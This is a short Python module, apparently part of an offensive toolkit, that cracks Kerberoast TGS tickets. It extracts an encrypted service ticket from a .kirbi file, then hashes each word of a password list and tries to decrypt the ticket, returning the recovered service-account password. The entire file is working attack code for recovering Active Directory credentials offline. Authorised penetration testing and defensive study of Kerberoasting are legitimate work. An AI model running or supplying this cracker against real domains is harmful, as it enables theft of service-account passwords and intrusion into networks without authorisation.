import core.kerberos.kerberos

def loadTicket(kerberoastTicketFile):
    enctickets = []
    i = 0
    et = core.kerberos.kerberos.extract_ticket_from_kirbi(kerberoastTicketFile)
    enctickets.append((et, i, kerberoastTicketFile))

    return enctickets

def loadWordlistAndCrack(enctickets, passwordWordlist):
    with open(passwordWordlist, 'r') as fp:
        for w in fp:
            word = w.strip()
            hash = core.kerberos.kerberos.ntlmhash(word)
            for et in enctickets:
                kdata, nonce = core.kerberos.kerberos.decrypt(hash, 2, et[0])
                if kdata:
                    enctickets.remove(et)
                    if len(enctickets) == 0:
                        status = 'Cracked'
                        crackedPassword = word
                        return status, crackedPassword

        if len(enctickets):
            status = 'Failed'
            crackedPassword = '(Unable to crack the TGS ticket)'
            return status, crackedPassword

def crack(kerberoastTicketFile, passwordWordlist):
    enctickets = loadTicket(kerberoastTicketFile)
    status, crackedPassword = loadWordlistAndCrack(enctickets, passwordWordlist)
    return status, crackedPassword